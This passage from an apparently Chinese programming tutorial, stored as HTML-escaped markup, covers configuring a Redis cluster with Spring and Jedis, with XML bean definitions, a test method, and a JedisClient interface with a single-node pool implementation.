class=&quot;hljs-name&quot;&gt;set&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7001&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7002&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7003&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7004&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7005&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.HostAndPort&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;192.168.5.128&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;7006&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;set&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;index&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;ref&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPoolConfig&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre readability=&quot;6.5&quot;&gt;
&lt;code class=&quot;hljs cs&quot; readability=&quot;7&quot;&gt;    &lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; ApplicationContext applicationContext;&lt;br/&gt;@&lt;span class=&quot;hljs-function&quot;&gt;Before&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;init&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;applicationContext = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ClassPathXmlApplicationContext(&lt;br/&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;classpath:applicationContext.xml&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;p&gt;&lt;br/&gt;@&lt;span class=&quot;hljs-function&quot;&gt;Test&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;testJedisCluster2&lt;/span&gt;() &lt;/span&gt;{&lt;br/&gt;JedisCluster jedisCluster = (JedisCluster) applicationContext.getBean(&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisCluster&quot;&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;jedisCluster.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;name&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;xiaoyi&quot;&lt;/span&gt;);&lt;br/&gt;String &lt;span class=&quot;hljs-keyword&quot;&gt;value&lt;/span&gt; = jedisCluster.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;name&quot;&lt;/span&gt;);&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(&lt;span class=&quot;hljs-keyword&quot;&gt;value&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;h6&quot;&gt;&lt;span&gt;&lt;strong&gt;6、向业务逻辑中添加缓存&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;  因为&lt;code&gt;集群是比较消耗成本的&lt;/code&gt;，所以在公司中，一般&lt;code&gt;生产环境使用集群&lt;/code&gt;，&lt;code&gt;开发环境使用单机版&lt;/code&gt;。&lt;br/&gt;  我们在&lt;code&gt;项目整合中&lt;/code&gt;都需要有。使用设计模式之策略模式：接口+实现类。&lt;br/&gt;  可以开发一个接口，有&lt;code&gt;单机版的实现类&lt;/code&gt;和&lt;code&gt;集群版的实现类&lt;/code&gt;。使用时可以&lt;code&gt;面向接口开发&lt;/code&gt;，不影响业务逻辑，&lt;code&gt;使用spring管理实现类&lt;/code&gt;，部署时&lt;code&gt;切换实现类&lt;/code&gt;即可。&lt;/p&gt;
&lt;h3 id=&quot;h61&quot;&gt;&lt;span&gt;&lt;strong&gt;6.1、接口封装&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;  常用的操作redis的方法提取出一个接口，分别对应单机版和集群版创建两个实现类。&lt;/p&gt;
&lt;h4 id=&quot;h611&quot;&gt;&lt;span&gt;&lt;strong&gt;6.1.1、接口定义&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;pre readability=&quot;12&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;18&quot;&gt;public &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;JedisClient&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key, &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; value);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key);&lt;/p&gt;&lt;p&gt;Boolean exists(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key);&lt;/p&gt;&lt;p&gt;Long expire(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key, &lt;span class=&quot;hljs-built_in&quot;&gt;int&lt;/span&gt; seconds);&lt;/p&gt;&lt;p&gt;Long ttl(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key);&lt;/p&gt;&lt;p&gt;Long incr(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key);&lt;/p&gt;&lt;p&gt;Long hset(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key, &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; field, &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; value);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; hget(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key, &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; field);&lt;/p&gt;&lt;p&gt;Long hdel(&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt; key, &lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;... field);&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h612redis&quot;&gt;&lt;span&gt;&lt;strong&gt;6.1.2、redis单机版实现类&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;pre readability=&quot;23.5&quot;&gt;
&lt;code class=&quot;hljs kotlin&quot; readability=&quot;41&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;JedisClientPool&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;JedisClient&lt;/span&gt; &lt;/span&gt;{&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Autowired&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; JedisPool jedisPool;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(String key, String value) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;String result = jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;set&lt;/span&gt;(key, value);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(String key) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;String result = jedis.&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt;(key);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Boolean&lt;/span&gt; exists(String key) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Boolean&lt;/span&gt; result = jedis.exists(key);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; expire(String key, int seconds) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; result = jedis.expire(key, seconds);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; ttl(String key) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; result = jedis.ttl(key);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; incr(String key) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; result = jedis.incr(key);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; hset(String key, String field, String value) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; result = jedis.hset(key, field, value);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String hget(String key, String field) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;String result = jedis.hget(key, field);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@Override&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; hdel(String key, String... field) {&lt;br/&gt;Jedis jedis = jedisPool.getResource();&lt;br/&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Long&lt;/span&gt; result = jedis.hdel(key, field);&lt;br/&gt;jedis.close();&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; result;&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;applicationContext-redis.xml&lt;/p&gt;
&lt;pre readability=&quot;5&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;4&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;beans&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;xmlns&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:context&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:p&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/p&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:aop&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:tx&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:dubbo&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://code.alibabatech.com/schema/dubbo&quot;&lt;/span&gt; &lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xmlns:xsi&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;xsi:schemaLocation&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://www.springframework.org/schema/beans &lt;br/&gt;http://www.springframework.org/schema/beans/spring-beans-4.2.xsd&lt;br/&gt;http://www.springframework.org/schema/context &lt;br/&gt;http://www.springframework.org/schema/context/spring-context-4.2.xsd&lt;br/&gt;http://www.springframework.org/schema/aop &lt;br/&gt;http://www.springframework.org/schema/aop/spring-aop-4.2.xsd &lt;br/&gt;http://www.springframework.org/schema/tx &lt;br/&gt;http://www.springframework.org/schema/tx/spring-tx-4.2.xsd&lt;br/&gt;http://code.alibabatech.com/schema/dubbo &lt;br/&gt;http://code.alibabatech.com/schema/dubbo/dubbo.xsd&lt;br/&gt;http://www.springframework.org/schema/util &lt;br/&gt;http://www.springframework.org/schema/util/spring-util-4.2.xsd&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;bean&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;jedisPool&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;redis.clients.jedis.JedisPool&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;constructor-arg&lt;/span&gt; &lt;span 